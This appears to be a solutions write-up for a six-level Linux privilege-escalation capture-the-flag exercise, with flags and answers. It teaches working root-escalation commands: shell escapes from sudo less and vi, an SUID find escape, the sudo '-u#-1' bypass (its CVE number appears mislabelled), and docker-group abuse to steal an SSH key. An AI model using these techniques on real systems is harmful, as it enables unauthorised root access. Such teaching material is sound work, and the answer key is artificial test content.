## Solutions 
- This is a list of solutions to various Linux priv esc Gauntlet.

### first_priv 

- Login using SSH
- This can be done with ssh first_priv@<ip> -p 2226
	- The password is the same as the username.
- Type ``sudo -l`` to see what sudo permissions you have
- Turns out you can do everything as sudo
- This could be a safe assumption that you are in the sudoers group.
- You can either type ``sudo cat /root/flag.txt`` or ``sudo su`` to become root then cat out the root file
- SC3{FIRST_PWN!}

### second_priv 

- Same login steps
- Type ``sudo -l`` to see what sudo permissions you have
- Looks like you can run the ``less`` command with sudo permssions
- less essentially displays a file for you and give you the ability to scroll through the file.
- Puts you in a ``less`` terminal
- You can ESCAPE this ``less`` terminal into a shell
- make a random file in /tmp directory because you have permissions there
- ``sudo less /tmp/random.txt``
- Once in the ``less`` terminal type ``!sh`` to escape into a sh shell
- This will give you a root shell
- ``cat /root/flag.txt``

SC3{L3SS_1S_M0rE}

### third_priv

- Same login steps

- Typing ``sudo -l`` gives you ``command not found`` error
- Users would need to understand absolute paths in order to understand this challenge
- Explain to users what absolute paths are and what PATH variables are used for hints
- ``echo $PATH`` to show path variable and verify that /bin/sh is not there, thus the box not recognizing certain commands such as sudo, vi, etc 
- With research, they will know ``sudo`` exists in the ``/usr/bin`` directory
- type ``/usr/bin/sudo -l`` to see what you can do
- Turns out you can specifically do this: ``/usr/bin/vi /opt/reminder.txt`` with sudo permissions
- This means you can run vi as sudo, but only for this particular file.
- Run ``sudo /usr/bin/bi /opt/reminder.txt``
- Now you are in vi terminal
- Just like with ``less`` you can escape to a shell by typing ``:!sh``
- You are now root
- ``cat /root/flag.txt``

SC3{MuSt_N33D_AbS0lUT3!}




### fourth_priv

- same login steps

- Notice now, there is nothing for ``sudo -l``
- Is there another way we can run a command with sudo permissions?
- The power of SUID bit
- Run this on terminal: ``find / -perm -u=s -type f 2>/dev/null; find / -perm -4000``
- This can be found anywhere online when searching up suid priv esc
- This essentially looks through entire file system for files that have the suid bit on and for the root user. 
- And if there are any errors, STDERROR (2) , they are put into /dev/null which basically is like a black hole
- Running this, there is one command that is interesting: ``/usr/bin/find``
- Use the trusty gtfobins.com to see what you can find on that.
- Turns out you can make a shell
- Run the line under the SUID section ``find . -exec /bin/sh -p \; -quit``
- The ``-p`` is extremely important. This magic flag prevents running sh using the .bashrc configuration of the current user
- otherwise, you would simply get a shell with the same user. 
- Now you are root
- ``cat /root/flag.txt``

SC3{The_P0w3r_0F_Su1D!}


### fifth_priv

- same login steps

- Type ``sudo -l`` There is a very interesting output. Doing some searching, you can understand what ``(ALL, !root) /bin/bash``
- This means that your user, can run sudo on the /bin/bash on any user EXCEPT for root 
- This teaches students that technically, the sudo command is simply running a command as another user. When you the omit what particular user, it just defaults to you trying to run a command as root
- Reading the man page of sudo explains this and shows that you can specify which user you want to use based on their id
- id's of users can be found in /etc/passwd or type ``id`` for your id
- Ex; ``sudo -u#1000 /bin/bash`` will run the /bin/bash as the user pertaining to id 1000
- For versions of sudo 1.8.24 and below, it is vulnerable to priv esc
- Specifically CVE2019-14827
- This explains that the function that maps the id number to the user incorrectly translates the number ``-1`` and its unsigned equivalent ``4294967295`` and translates it to ``0`` which, based on /etc/passwd is the id for root
- Thus, you can bypass the rule in the sudoers file. If you give ``sudo -u#0`` this will automatically fail as ``0`` pertains to root, but the two numbers speficied above do not pertain to the root user, thus bypassing the restriction, but then once its translated, it turns to 0, thus giving you the permission to run as root
- Running ``sudo -u#-1 /bin/bash`` will give you a root shell
- ``cat /root/flag.txt`` 

SC3{NuMb3rs_G1v3_U_R00T}

	
	
### sixth_priv
	
- same login steps

- trying all the previous steps would not work
- This challenge regardless still focuses on what the user's capabilities can do
- In this case, what capabilities can he do based on the GROUPS that he is in
-if you type ``id`` or ``group`` you will see that sixth_priv user is in the docker group
- Right away you should search up ways in how to take advantage and escalate privs by being part of the docker group
- With docker permissions you can list out the running dockers and grant yourself a root shell in any of those containers
- This does not mean you get root on this particular box, but getting root somewhere else can be beneficial as their might be info there for you to use.
- Type ``docker container ps`` to see the running dockers
- Type ``docker run -it take_my_job bash`` to give your self an interactive bash shell in the take_my_job container
- Now you are root in this container
- Going to root folder, there is not a root flag
- But upon closer inspection, there is a .ssh folder and here you see there is id_rsa file. A private key. Perhaps this can be used to login as root in the other box??
- Copy and paste this file locally
- Type ``chmod 600 id_rsa`` to give file valid permissions
- Finally run ``ssh -i id_rsa root@<IP> -p 2231``
- This teaches that students that you can also login through ssh using crptographically generated keys. No password needed.
- You are now root
- Run ``cat /root/flag.txt``

SC3{D3Is0laTED_AND_D3Thr0N3D}
